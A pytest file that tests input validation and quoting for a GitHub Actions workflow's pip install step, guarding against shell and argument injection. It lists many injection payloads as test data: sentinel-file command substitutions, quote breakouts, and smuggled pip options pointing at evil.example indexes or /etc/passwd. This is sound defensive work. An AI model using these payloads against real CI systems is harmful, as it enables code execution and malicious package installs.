"""phantom-capture.yml "Install Phantom" step: handling of the ``phantom-version`` input.

The step's ``run:`` script is read from the workflow file and executed verbatim with
``bash -e`` (how the Actions runner executes a Linux step with no ``shell:`` set), with
``pip`` and ``phantom`` replaced by stubs that only record their arguments. Nothing is
installed and nothing touches the network.

* Compatibility: each accepted form composes exactly its expected install target, with
  and without the AI extra. Version specifiers and exact versions compose the target the
  workflow has always produced. Git refs compose a PEP 508 direct reference,
  ``phantom-docs[ai] @ git+<url>@<ref>``, parsed here to show the extra sits on the name
  and the ref is the whole revision.
* Adversarial: every other value is rejected by the validator itself (exit 1 plus its
  ``::error`` annotation) before ``pip`` runs. Payloads that try to run a command
  target a sentinel file, and a positive control shows the same payloads do execute
  when rendered into script text the way the old interpolation did. With validation
  bypassed, the composed target still reaches ``pip`` as one argument and nothing runs.
* Anti-inertness: ``test_bypassed_rejection_is_detected`` shows the harness notices a
  validator that reports a bad value but lets the step continue.

A NUL byte cannot be tested: it cannot be carried in an environment variable at all.
"""

from __future__ import annotations

import os
import re
import shutil
import subprocess
import tempfile
from dataclasses import dataclass
from functools import cache
from pathlib import Path
from typing import Any
from urllib.parse import urlsplit

import pytest
from packaging.requirements import InvalidRequirement, Requirement
from ruamel.yaml import YAML

REPO_ROOT = Path(__file__).resolve().parents[2]
WORKFLOWS_DIR = REPO_ROOT / ".github" / "workflows"
CAPTURE_WORKFLOW = WORKFLOWS_DIR / "phantom-capture.yml"
INSTALL_STEP = "Install Phantom"
REJECTION = "::error title=Invalid phantom-version::"
GIT = "git+https://github.com/wbuscombe/phantom.git@"
AI_FLAGS = ("AI_ANALYST", "AI_DOCUMENT", "AI_AUTO")
SENTINEL = "@SENTINEL@"
# The Actions Ubuntu image runs with LANG=C.UTF-8; "C" is the byte-wise locale.
LOCALES = ("C.UTF-8", "C")
EXPRESSION = re.compile(r"\$\{\{.*?\}\}", re.DOTALL)

_RECORDING_STUB = """#!/bin/sh
printf '%s\\0' "$@" >> "$PHANTOM_TEST_CALLS/{name}"
"""


@dataclass
class InstallRun:
    returncode: int
    output: str
    pip: list[str] | None
    phantom: list[str] | None


def _load(path: Path) -> Any:
    return YAML(typ="safe").load(path.read_text(encoding="utf-8"))


@cache
def _install_step() -> dict[str, Any]:
    steps = _load(CAPTURE_WORKFLOW)["jobs"]["capture"]["steps"]
    matches = [step for step in steps if step.get("name") == INSTALL_STEP]
    assert len(matches) == 1, f"expected exactly one {INSTALL_STEP!r} step"
    step: dict[str, Any] = matches[0]
    return step


def _recorded(path: Path) -> list[str] | None:
    if not path.exists():
        return None
    return path.read_bytes().decode("utf-8", "surrogateescape").split("\0")[:-1]


def _run(
    tmp_path: Path,
    version: str,
    *,
    ai: str | None = None,
    script: str | None = None,
    locale: str = LOCALES[0],
) -> InstallRun:
    """Execute the install step's script (or ``script``) against recording stubs."""
    bash = shutil.which("bash")
    assert bash is not None, "bash is required to execute the workflow step"
    work = Path(tempfile.mkdtemp(dir=tmp_path))
    bin_dir, calls = work / "bin", work / "calls"
    bin_dir.mkdir()
    calls.mkdir()
    for name in ("pip", "phantom"):
        stub = bin_dir / name
        stub.write_text(_RECORDING_STUB.format(name=name))
        stub.chmod(0o755)
    script_path = work / "step.sh"
    script_path.write_text(_install_step()["run"] if script is None else script)
    env = {
        "PATH": f"{bin_dir}{os.pathsep}{os.environ['PATH']}",
        "HOME": str(work),
        "LC_ALL": locale,
        "PHANTOM_TEST_CALLS": str(calls),
        "PHANTOM_VERSION": version,
        **{flag: "true" if flag == ai else "false" for flag in AI_FLAGS},
    }
    proc = subprocess.run(
        [bash, "-e", str(script_path)],
        env=env,
        capture_output=True,
        encoding="utf-8",
        errors="replace",
        timeout=60,
        check=False,
    )
    return InstallRun(
        proc.returncode,
        proc.stdout + proc.stderr,
        _recorded(calls / "pip"),
        _recorded(calls / "phantom"),
    )


def _arm(value: str, sentinel: Path) -> str:
    """Point a payload's ``touch`` at ``sentinel`` (a path that needs no quoting)."""
    assert re.fullmatch(r"[A-Za-z0-9._/-]+", str(sentinel)), sentinel
    return value.replace(SENTINEL, str(sentinel))


def _assert_rejected(run: InstallRun) -> None:
    assert run.returncode == 1, run.output
    assert REJECTION in run.output, run.output
    assert run.pip is None, f"pip ran with {run.pip!r}"
    assert run.phantom is None


def _bypassed_script() -> str:
    """The shipped script with ``reject`` still reporting but no longer stopping the step."""
    script = _install_step()["run"]
    assert script.count("exit 1") == 1, "expected exactly one exit, inside reject()"
    return script.replace("exit 1", "true")


def _pip_revision(url: str) -> str:
    """The revision pip checks out for a VCS URL: whatever follows the path's last ``@``."""
    return urlsplit(url).path.rsplit("@", 1)[1]


# ── Structure: the value reaches the shell only through step env ──


def _run_scripts() -> list[tuple[str, str]]:
    scripts = []
    for workflow in sorted(WORKFLOWS_DIR.glob("*.y*ml")):
        for job_id, job in _load(workflow)["jobs"].items():
            for index, step in enumerate(job.get("steps", [])):
                if "run" in step:
                    label = f"{workflow.name}:{job_id}:{step.get('name', index)}"
                    scripts.append((label, step["run"]))
    return scripts


def _quoting_of_expansions(line: str, names: tuple[str, ...]) -> list[bool]:
    """For each ``$NAME`` / ``${NAME}`` on a shell line, whether it is double-quoted."""
    flags: list[bool] = []
    single = double = False
    i = 0
    while i < len(line):
        char = line[i]
        if single:
            single = char != "'"
        elif char == "\\":
            i += 1
        elif char == "'" and not double:
            single = True
        elif char == '"':
            double = not double
        elif char == "#" and not double and (i == 0 or line[i - 1] in " \t"):
            break
        elif char == "$":
            match = re.match(r"\{?([A-Za-z_][A-Za-z0-9_]*)", line[i + 1 :])
            if match and match.group(1) in names:
                flags.append(double)
        i += 1
    return flags


def test_phantom_version_is_never_interpolated_into_a_run_script() -> None:
    scripts = _run_scripts()
    assert any(label.endswith(f":{INSTALL_STEP}") for label, _ in scripts)
    offenders = [
        label
        for label, run in scripts
        for expression in EXPRESSION.findall(run)
        if "phantom-version" in expression
    ]
    assert offenders == []


def test_install_step_takes_the_version_from_step_env() -> None:
    step = _install_step()
    assert step["env"]["PHANTOM_VERSION"] == "${{ inputs.phantom-version }}"
    # No expression of any kind is left in the script text, so the harness below
    # executes exactly the bytes the runner would.
    assert "${{" not in step["run"]
    assert re.search(r"\beval\b", step["run"]) is None


def test_caller_derived_values_are_always_double_quoted() -> None:
    unquoted = []
    flags_seen = 0
    for lineno, line in enumerate(_install_step()["run"].splitlines(), 1):
        flags = _quoting_of_expansions(line, ("PHANTOM_VERSION", "TARGET"))
        flags_seen += len(flags)
        if not all(flags):
            unquoted.append((lineno, line.strip()))
    assert flags_seen > 0
    assert unquoted == []


# ── Compatibility: accepted forms compose their exact install target ──

# Specifier and exact-version targets are unchanged from before validation was added.
# Git-ref targets are PEP 508 direct references with the extra on the name. They used
# to append the extra after the ref ("git+<url>@main[ai]"), which pip parses as the
# nonexistent revision "main[ai]" with no extra, so that install could never succeed.
COMPATIBLE = [
    # Forms evidenced in this repository (workflow default, history, docs, refs).
    pytest.param(
        ">=0.4,<0.5", "phantom-docs>=0.4,<0.5", "phantom-docs[ai]>=0.4,<0.5", id="default-range"
    ),
    pytest.param(
        ">=0.3,<0.4", "phantom-docs>=0.3,<0.4", "phantom-docs[ai]>=0.3,<0.4", id="old-default-0.3"
    ),
    pytest.param(
        ">=0.2,<0.3", "phantom-docs>=0.2,<0.3", "phantom-docs[ai]>=0.2,<0.3", id="old-default-0.2"
    ),
    pytest.param("==0.4.*", "phantom-docs==0.4.*", "phantom-docs[ai]==0.4.*", id="minor-wildcard"),
    pytest.param("0.2.0", "phantom-docs==0.2.0", "phantom-docs[ai]==0.2.0", id="exact-old-default"),
    pytest.param("0.4.0", "phantom-docs==0.4.0", "phantom-docs[ai]==0.4.0", id="exact-current"),
    pytest.param(
        "main",
        "phantom-docs @ git+https://github.com/wbuscombe/phantom.git@main",
        "phantom-docs[ai] @ git+https://github.com/wbuscombe/phantom.git@main",
        id="ref-main",
    ),
    pytest.param(
        "feature-branch",
        "phantom-docs @ git+https://github.com/wbuscombe/phantom.git@feature-branch",
        "phantom-docs[ai] @ git+https://github.com/wbuscombe/phantom.git@feature-branch",
        id="ref-hyphenated",
    ),
    pytest.param(
        "pr-004/phantom-contract-freeze",
        "phantom-docs @ git+https://github.com/wbuscombe/phantom.git@pr-004/phantom-contract-freeze",
        "phantom-docs[ai] @ git+https://github.com/wbuscombe/phantom.git@pr-004/phantom-contract-freeze",
        id="ref-slashed-branch",
    ),
    pytest.param(
        "fix/action-pins-node24",
        "phantom-docs @ git+https://github.com/wbuscombe/phantom.git@fix/action-pins-node24",
        "phantom-docs[ai] @ git+https://github.com/wbuscombe/phantom.git@fix/action-pins-node24",
        id="ref-fix-branch",
    ),
    pytest.param(
        "v0.4.0",
        "phantom-docs @ git+https://github.com/wbuscombe/phantom.git@v0.4.0",
        "phantom-docs[ai] @ git+https://github.com/wbuscombe/phantom.git@v0.4.0",
        id="ref-release-tag",
    ),
    # Other PEP 440 operators within the documented "version constraint" category.
    pytest.param(
        "~=0.4.0", "phantom-docs~=0.4.0", "phantom-docs[ai]~=0.4.0", id="grammar-compatible"
    ),
    pytest.param("!=0.4.1", "phantom-docs!=0.4.1", "phantom-docs[ai]!=0.4.1", id="grammar-exclude"),
    pytest.param(
        "!=0.3.*", "phantom-docs!=0.3.*", "phantom-docs[ai]!=0.3.*", id="grammar-exclude-wild"
    ),
    pytest.param("<=0.4.9", "phantom-docs<=0.4.9", "phantom-docs[ai]<=0.4.9", id="grammar-le"),
    pytest.param(">0.3", "phantom-docs>0.3", "phantom-docs[ai]>0.3", id="grammar-gt"),
    pytest.param("<0.5", "phantom-docs<0.5", "phantom-docs[ai]<0.5", id="grammar-lt"),
    pytest.param(
        "==0.4.0", "phantom-docs==0.4.0", "phantom-docs[ai]==0.4.0", id="grammar-eq-exact"
    ),
    pytest.param(
        ">=0.4.0,<0.5.0,!=0.4.1",
        "phantom-docs>=0.4.0,<0.5.0,!=0.4.1",
        "phantom-docs[ai]>=0.4.0,<0.5.0,!=0.4.1",
        id="grammar-three-clauses",
    ),
]


@pytest.mark.parametrize("ai", [None, *AI_FLAGS])
@pytest.mark.parametrize(("value", "target", "ai_target"), COMPATIBLE)
def test_accepted_form_installs_the_expected_target(
    tmp_path: Path, value: str, target: str, ai_target: str, ai: str | None
) -> None:
    run = _run(tmp_path, value, ai=ai)
    assert run.returncode == 0, run.output
    assert run.pip == ["install", ai_target if ai else target]
    assert run.phantom == ["--version"]


# The table rows above, split by the category the validator assigns their value.
REF_FORMS = [param for param in COMPATIBLE if str(param.id).startswith("ref-")]
SPECIFIER_FORMS = [param for param in COMPATIBLE if param not in REF_FORMS]


def test_every_category_has_accepted_forms() -> None:
    assert len(REF_FORMS) == 5
    assert len(SPECIFIER_FORMS) == len(COMPATIBLE) - 5 > 0


@pytest.mark.parametrize("ai", [False, True])
@pytest.mark.parametrize(("value", "target", "ai_target"), REF_FORMS)
def test_git_ref_target_is_a_pep508_direct_reference(
    value: str, target: str, ai_target: str, ai: bool
) -> None:
    """The extra is on the name, and the ref is the entire revision pip checks out."""
    requirement = Requirement(ai_target if ai else target)
    assert requirement.name == "phantom-docs"
    assert requirement.extras == ({"ai"} if ai else set())
    assert requirement.url == f"{GIT}{value}"
    assert _pip_revision(requirement.url) == value
    assert str(requirement.specifier) == ""
    assert requirement.marker is None


@pytest.mark.parametrize("ai", [False, True])
@pytest.mark.parametrize(("value", "target", "ai_target"), SPECIFIER_FORMS)
def test_specifier_target_is_a_named_requirement(
    value: str, target: str, ai_target: str, ai: bool
) -> None:
    requirement = Requirement(ai_target if ai else target)
    assert requirement.name == "phantom-docs"
    assert requirement.extras == ({"ai"} if ai else set())
    assert requirement.url is None
    assert requirement.marker is None


def test_extra_appended_after_the_ref_lands_in_the_revision() -> None:
    """Positive control: the two checks above can see the defect this form fixed.

    The workflow used to compose ``git+<url>@main[ai]``. That is not a named
    requirement, so nothing carries the extra, and pip would check out the
    nonexistent revision ``main[ai]``.
    """
    old = f"{GIT}main[ai]"
    with pytest.raises(InvalidRequirement):
        Requirement(old)
    assert _pip_revision(old) == "main[ai]"


@pytest.mark.parametrize("locale", LOCALES)
@pytest.mark.parametrize(
    ("value", "target"),
    [
        (">=0.4,<0.5", "phantom-docs>=0.4,<0.5"),
        ("0.2.0", "phantom-docs==0.2.0"),
        ("pr-004/phantom-contract-freeze", f"phantom-docs @ {GIT}pr-004/phantom-contract-freeze"),
    ],
)
def test_accepted_forms_do_not_depend_on_locale(
    tmp_path: Path, value: str, target: str, locale: str
) -> None:
    run = _run(tmp_path, value, locale=locale)
    assert run.returncode == 0, run.output
    assert run.pip == ["install", target]


def test_declared_default_is_accepted(tmp_path: Path) -> None:
    inputs = _load(CAPTURE_WORKFLOW)["on"]["workflow_call"]["inputs"]
    default = inputs["phantom-version"]["default"]
    run = _run(tmp_path, default)
    assert run.returncode == 0, run.output
    assert run.pip == ["install", f"phantom-docs{default}"]


# ── Precedence: one value, one category ──


@pytest.mark.parametrize(
    ("value", "target"),
    [
        pytest.param("0.2.0", "phantom-docs==0.2.0", id="N.N.N-is-exact-not-ref"),
        pytest.param("==0.2.0", "phantom-docs==0.2.0", id="operator-means-specifier"),
        # Boundary cases, not documented forms: routed to the same category as always.
        pytest.param("0.2", f"phantom-docs @ {GIT}0.2", id="N.N-is-ref"),
        pytest.param("v0.2.0", f"phantom-docs @ {GIT}v0.2.0", id="v-prefix-is-ref"),
        pytest.param("0a2a0", f"phantom-docs @ {GIT}0a2a0", id="version-dot-is-literal"),
    ],
)
def test_category_precedence_is_fixed(tmp_path: Path, value: str, target: str) -> None:
    run = _run(tmp_path, value)
    assert run.returncode == 0, run.output
    assert run.pip == ["install", target]


@pytest.mark.parametrize(
    "value",
    ["0.2.0rc1", "0.2.0.dev1", "0.2.0.1", "0.2.0-hotfix", "0.2.0/x", "0.2.0.", "0.2.0+local"],
)
def test_version_shaped_value_is_rejected_not_rerouted(tmp_path: Path, value: str) -> None:
    """An N.N.N-prefixed value stays an exact version; it never falls back to a git ref."""
    _assert_rejected(_run(tmp_path, value))


# ── Adversarial: rejected before install, and nothing executes ──

# Payloads that DO execute when rendered into the old `VERSION="..."` script line.
ARMED = [
    pytest.param(f"$(touch {SENTINEL})", id="subst"),
    pytest.param(f"`touch {SENTINEL}`", id="backtick"),
    pytest.param(f"main$(touch {SENTINEL})", id="subst-after-ref"),
    pytest.param(f"main`touch {SENTINEL}`", id="backtick-after-ref"),
    pytest.param(f">=0.4,<0.5$(touch {SENTINEL})", id="subst-after-range"),
    pytest.param(f"0.2.0$(touch {SENTINEL})", id="subst-after-exact"),
    pytest.param(f'";touch {SENTINEL};"', id="dquote-breakout"),
    pytest.param(f'";touch {SENTINEL} #', id="dquote-breakout-comment"),
    pytest.param(f'>=0.4,<0.5";touch {SENTINEL};"', id="dquote-breakout-after-range"),
    pytest.param(f'main"&&touch {SENTINEL}&&"', id="dquote-breakout-and"),
    pytest.param(f'"\ntouch {SENTINEL}\n"', id="dquote-newline-breakout"),
    pytest.param(f'\\\\";touch {SENTINEL};#', id="backslash-escape-breakout"),
    # Aimed at the PEP 508 target's space and " @ " separator.
    pytest.param(f"main @ $(touch {SENTINEL})", id="pep508-subst-after-separator"),
    pytest.param(f"main[ai] @ `touch {SENTINEL}`", id="pep508-backtick-after-separator"),
    pytest.param(f"$(touch {SENTINEL}) @ git+https://evil.example/x.git", id="pep508-subst-name"),
]

UNSAFE = [
    pytest.param("", id="empty"),
    # Quotes and quote-escape attempts.
    pytest.param("main'", id="squote"),
    pytest.param('main"', id="dquote"),
    pytest.param('"main"', id="dquoted-ref"),
    pytest.param("'main'", id="squoted-ref"),
    pytest.param("main\\", id="trailing-backslash"),
    pytest.param(f'\\";touch {SENTINEL};\\"', id="escaped-dquote"),
    pytest.param(f"';touch {SENTINEL};'", id="squote-breakout"),
    # Newlines and control characters.
    pytest.param("main\n", id="lf-suffix"),
    pytest.param("\nmain", id="lf-prefix"),
    pytest.param(f"main\ntouch {SENTINEL}", id="lf-command"),
    pytest.param("main\r", id="cr-suffix"),
    pytest.param(f"main\rtouch {SENTINEL}", id="cr-command"),
    pytest.param("main\r\n", id="crlf"),
    pytest.param(f">=0.4,<0.5\ntouch {SENTINEL}", id="lf-command-after-range"),
    pytest.param("0.2.0\n", id="lf-after-exact"),
    pytest.param("main\x1b[31m", id="esc"),
    pytest.param("main\x07", id="bel"),
    pytest.param("main\x7f", id="del"),
    pytest.param("main\x01", id="soh"),
    pytest.param("main\x0b", id="vt"),
    pytest.param("main\x0c", id="ff"),
    # Whitespace.
    pytest.param(" ", id="space-only"),
    pytest.param("feature branch", id="space-in-ref"),
    pytest.param(" main", id="leading-space"),
    pytest.param("main ", id="trailing-space"),
    pytest.param("main\t", id="tab"),
    pytest.param(">= 0.4, < 0.5", id="spaced-range"),
    pytest.param(">=0.4, <0.5", id="space-after-comma"),
    pytest.param("0.2.0 ", id="space-after-exact"),
    # Malformed specifiers.
    pytest.param(">=", id="ge-alone"),
    pytest.param("==", id="eq-alone"),
    pytest.param(">=1.0,", id="trailing-comma"),
    pytest.param("<<0.5", id="double-lt"),
    pytest.param("==*.*.*", id="wildcards-only"),
    pytest.param(">=0.4,,<0.5", id="double-comma"),
    pytest.param(",>=0.4", id="leading-comma"),
    pytest.param(">=0.4.*", id="wildcard-on-ge"),
    pytest.param("==0.4.*.*", id="double-wildcard"),
    pytest.param("==0.*.4", id="inner-wildcard"),
    pytest.param("===0.4", id="arbitrary-equality"),
    pytest.param("=0.4", id="single-equals"),
    pytest.param(">==0.4", id="ge-eq"),
    pytest.param(">=0.4,<", id="dangling-operator"),
    pytest.param("~=", id="tilde-alone"),
    pytest.param("~=1", id="tilde-single-segment"),
    pytest.param(">=a.b", id="letters"),
    pytest.param(">=.4", id="leading-dot"),
    pytest.param(">=0.4.", id="trailing-dot"),
    pytest.param(">=0.4rc1", id="prerelease-bound"),
    pytest.param(">=v0.4", id="v-prefixed-bound"),
    pytest.param(">=0.4+local", id="local-version-bound"),
    pytest.param(">=1!0.4", id="epoch-bound"),
    pytest.param(">=0.4;python_version<'4'", id="env-marker"),
    pytest.param("[ai]>=0.4", id="caller-extra-specifier"),
    # Unsafe refs.
    pytest.param("..", id="dotdot"),
    pytest.param("../main", id="dotdot-prefix"),
    pytest.param("main/..", id="dotdot-suffix"),
    pytest.param("feature/../main", id="dotdot-middle"),
    pytest.param("a..b", id="dotdot-embedded"),
    pytest.param("/main", id="leading-slash"),
    pytest.param("main/", id="trailing-slash"),
    pytest.param("feature//x", id="double-slash"),
    pytest.param("main@{1}", id="reflog"),
    pytest.param("@{-1}", id="previous-branch"),
    pytest.param("main@{upstream}", id="upstream"),
    pytest.param("main~1", id="ancestry"),
    pytest.param("HEAD:README.md", id="path-in-rev"),
    pytest.param("main#egg=evil", id="url-fragment"),
    pytest.param("main?x=1", id="url-query"),
    pytest.param("main%20x", id="url-escape"),
    pytest.param("main@https://evil.example/x.git", id="url-override"),
    pytest.param("main[ai]", id="caller-extra-ref"),
    # Leading hyphen: pip would read the value, or its tail, as an option.
    pytest.param("-", id="hyphen-alone"),
    pytest.param("-main", id="hyphen-ref"),
    pytest.param("-e", id="editable-flag"),
    pytest.param("--pre", id="pre-flag"),
    pytest.param("--index-url=https://evil.example/simple", id="index-url"),
    pytest.param("-ihttps://evil.example/simple", id="index-url-short"),
    pytest.param("-r/etc/passwd", id="requirements-file"),
    pytest.param("-0.2.0", id="hyphen-exact"),
    pytest.param("->=0.4", id="hyphen-specifier"),
    # Well-formed values carrying a suffix payload.
    pytest.param(f">=0.4,<0.5; touch {SENTINEL}", id="range-semicolon"),
    pytest.param(f">=0.4,<0.5&&touch {SENTINEL}", id="range-and"),
    pytest.param(f">=0.4,<0.5|touch {SENTINEL}", id="range-pipe"),
    pytest.param(f">=0.4,<0.5&touch {SENTINEL}", id="range-background"),
    pytest.param(f">=0.4,<0.5,;touch {SENTINEL}", id="range-comma-semicolon"),
    pytest.param(">=0.4,<0.5 --index-url=https://evil.example/simple", id="range-option"),
    pytest.param(">=0.4,<0.5 #", id="range-comment"),
    pytest.param(f"==0.4.*;touch {SENTINEL}", id="wildcard-semicolon"),
    pytest.param(f"0.2.0;touch {SENTINEL}", id="exact-semicolon"),
    pytest.param(f"main;touch {SENTINEL}", id="ref-semicolon"),
    pytest.param(f"main && touch {SENTINEL}", id="ref-and"),
    pytest.param(f"main>{SENTINEL}", id="ref-redirect"),
    pytest.param("main --extra-index-url https://evil.example/simple", id="ref-option"),
    # PEP 508 direct reference: in "phantom-docs[ai] @ git+<url>@<ref>" the space, the
    # "@" separators and the extras brackets must only ever come from the workflow.
    pytest.param("main @ git+https://evil.example/x.git", id="pep508-second-url"),
    pytest.param("main@git+https://evil.example/x.git", id="pep508-vcs-url-override"),
    pytest.param("@ git+https://evil.example/x.git", id="pep508-leading-separator"),
    pytest.param("main @", id="pep508-dangling-separator"),
    pytest.param("@main", id="pep508-at-prefix"),
    pytest.param("main@", id="pep508-at-suffix"),
    pytest.param("@", id="pep508-at-alone"),
    pytest.param("phantom-docs @ git+https://evil.example/x.git", id="pep508-whole-reference"),
    pytest.param(f"phantom-docs[ai] @ {GIT}main", id="pep508-own-target"),
    pytest.param("evil @ https://evil.example/evil-1.0-py3-none-any.whl", id="pep508-other-dist"),
    pytest.param("main ; python_version>'0'", id="pep508-marker"),
    pytest.param("main;python_version>'0'", id="pep508-marker-no-space"),
    pytest.param("main\t@\tgit+https://evil.example/x.git", id="pep508-tab-separator"),
    pytest.param("main\n--index-url=https://evil.example/simple", id="pep508-newline-option"),
    pytest.param("main -e git+https://evil.example/x.git", id="pep508-editable-option"),
    pytest.param("main evil-package", id="pep508-second-requirement"),
    # Extras come only from the ai-* flags, and only on the name, in either category.
    pytest.param("main]", id="extra-rbracket-ref"),
    pytest.param("[main", id="extra-lbracket-ref"),
    pytest.param("[ai]", id="extra-alone"),
    pytest.param("[ai]main", id="extra-before-ref"),
    pytest.param("main[dev]", id="extra-other-ref"),
    pytest.param("[ai] @ git+https://evil.example/x.git", id="extra-with-separator"),
    pytest.param(">=0.4[ai]", id="extra-after-specifier"),
    pytest.param("phantom-docs[ai]>=0.4", id="extra-named-specifier"),
    pytest.param("0.2.0[ai]", id="extra-after-exact"),
    pytest.param("[ai]0.2.0", id="extra-before-exact"),
    pytest.param(">=0.4,<0.5 @ git+https://evil.example/x.git", id="specifier-with-separator"),
    pytest.param("0.2.0 @ git+https://evil.example/x.git", id="exact-with-separator"),
]

METACHARACTERS = {
    ";": "semicolon",
    "&": "ampersand",
    "|": "pipe",
    ">": "gt",
    "<": "lt",
    "*": "star",
    "?": "question",
    "(": "lparen",
    ")": "rparen",
    "{": "lbrace",
    "}": "rbrace",
    "$": "dollar",
    "!": "bang",
    "#": "hash",
    "`": "backtick",
    "'": "squote",
    '"': "dquote",
    "\\": "backslash",
    "~": "tilde",
    "^": "caret",
    ":": "colon",
    "@": "at",
    "[": "lbracket",
    "]": "rbracket",
    "%": "percent",
    "+": "plus",
    ",": "comma",
    "=": "equals",
}
METACHARACTER_CASES = [
    pytest.param(template.format(c=char), id=f"{name}-{where}")
    for char, name in METACHARACTERS.items()
    for where, template in (
        ("alone", "{c}"),
        ("in-ref", "main{c}x"),
        ("after-range", ">=0.4,<0.5{c}"),
        ("after-exact", "0.2.0{c}"),
    )
]

# Written as escapes so the source stays ASCII; each looks like an accepted form.
NON_ASCII = [
    pytest.param("m\u0430in", id="cyrillic-a"),
    pytest.param("\uff10.\uff12.\uff10", id="fullwidth-digits"),
    pytest.param("\u0660.\u0662.\u0660", id="arabic-indic-digits"),
    pytest.param(">=\uff10.4", id="fullwidth-digit-in-range"),
    pytest.param("feature\u2215x", id="division-slash"),
    pytest.param("main\u00a0", id="nbsp"),
    pytest.param("main\u200b", id="zero-width-space"),
    pytest.param("\u2010main", id="unicode-hyphen-prefix"),
]


@pytest.mark.parametrize("value", [*ARMED, *UNSAFE, *METACHARACTER_CASES])
def test_unsafe_value_is_rejected_before_install(tmp_path: Path, value: str) -> None:
    sentinel = tmp_path / "sentinel"
    run = _run(tmp_path, _arm(value, sentinel))
    _assert_rejected(run)
    assert not sentinel.exists(), "a payload executed"


@pytest.mark.parametrize("locale", LOCALES)
@pytest.mark.parametrize("value", NON_ASCII)
def test_non_ascii_lookalike_is_rejected_in_any_locale(
    tmp_path: Path, value: str, locale: str
) -> None:
    _assert_rejected(_run(tmp_path, value, locale=locale))


@pytest.mark.parametrize("value", ARMED)
def test_armed_payload_executes_under_old_interpolation(tmp_path: Path, value: str) -> None:
    """Positive control: the sentinel check really can observe execution.

    Renders the payload into script text the way the step's former
    ``VERSION="${{ inputs.phantom-version }}"`` line did, then shows it runs. The
    same payloads are rejected, with no sentinel, by the test above.
    """
    sentinel = tmp_path / "sentinel"
    _run(tmp_path, "", script=f'VERSION="{_arm(value, sentinel)}"\n')
    assert sentinel.exists()


@pytest.mark.parametrize("ai", [None, "AI_AUTO"])
@pytest.mark.parametrize("value", ARMED)
def test_composed_target_stays_one_argument_without_validation(
    tmp_path: Path, value: str, ai: str | None
) -> None:
    """Quoting alone keeps a payload inert inside the composed target.

    With ``reject`` no longer stopping the step, every armed payload is composed into
    a target, including the PEP 508 form with its space and ``@`` separator. It must
    still reach ``pip`` as the one argument after ``install``, and nothing may run.
    """
    sentinel = tmp_path / "sentinel"
    armed = _arm(value, sentinel)
    run = _run(tmp_path, armed, ai=ai, script=_bypassed_script())
    assert run.pip is not None, run.output
    assert len(run.pip) == 2, run.pip
    assert run.pip[0] == "install"
    assert armed in run.pip[1]
    assert not sentinel.exists(), "a payload executed"


@pytest.mark.parametrize(
    ("value", "target"),
    [
        pytest.param("main;touch x", f"phantom-docs @ {GIT}main;touch x", id="ref-semicolon"),
        pytest.param(
            "main @ git+https://evil.example/x.git",
            f"phantom-docs @ {GIT}main @ git+https://evil.example/x.git",
            id="pep508-second-url",
        ),
    ],
)
def test_bypassed_rejection_is_detected(tmp_path: Path, value: str, target: str) -> None:
    """Anti-inertness: a validator that reports but does not stop the step is caught.

    Mutates the shipped script so ``reject`` no longer exits, then shows an unsafe
    value reaches the pip stub and fails ``_assert_rejected``. The adversarial tests
    above therefore cannot pass against a gate that does not actually stop install.
    """
    run = _run(tmp_path, value, script=_bypassed_script())
    assert run.pip == ["install", target]
    with pytest.raises(AssertionError):
        _assert_rejected(run)
